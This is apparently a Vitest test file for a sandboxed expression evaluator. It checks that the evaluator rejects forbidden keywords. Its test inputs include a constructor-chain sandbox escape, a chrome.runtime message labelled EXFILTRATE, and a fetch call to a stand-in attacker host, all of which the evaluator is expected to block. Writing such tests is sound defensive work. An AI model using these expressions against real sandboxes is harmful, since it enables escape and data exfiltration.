import { describe, it, expect, vi } from 'vitest';
import { handleTransform } from './transform';

describe('handleTransform', () => {
  const context: any = {
    getNextNodeId: () => 'next-node'
  };

  it('should transform standard math expressions correctly', async () => {
    const config = {
      expr: 'input.val * 2'
    };
    const inputs = { val: 5 };

    const result = await handleTransform(config, inputs, context);
    expect(result.data.data).toBe(10);
    expect(result.nextNodeId).toBe('next-node');
  });

  it('should shadow browser and node global objects', async () => {
    const config = {
      expr: 'window === null ? "shadowed" : "leaked"'
    };

    const result = await handleTransform(config, {}, context);
    expect(result.data.data).toBe('shadowed');
  });

  it('should block exfiltration vectors containing constructor keyword', async () => {
    const config = {
      expr: 'input.constructor.constructor("return window")()'
    };

    await expect(handleTransform(config, { val: 1 }, context))
      .rejects.toThrow('Security violation: expression contains forbidden pattern (\\bconstructor\\b)');
  });

  it('should block exfiltration vectors containing chrome keyword', async () => {
    const config = {
      expr: 'chrome.runtime.sendMessage({ type: "EXFILTRATE" })'
    };

    await expect(handleTransform(config, {}, context))
      .rejects.toThrow('Security violation: expression contains forbidden pattern (\\bchrome\\b)');
  });

  it('should block exfiltration vectors containing fetch keyword', async () => {
    const config = {
      expr: 'fetch("https://attacker.com")'
    };

    await expect(handleTransform(config, {}, context))
      .rejects.toThrow('Security violation: expression contains forbidden pattern (\\bfetch\\b)');
  });
});
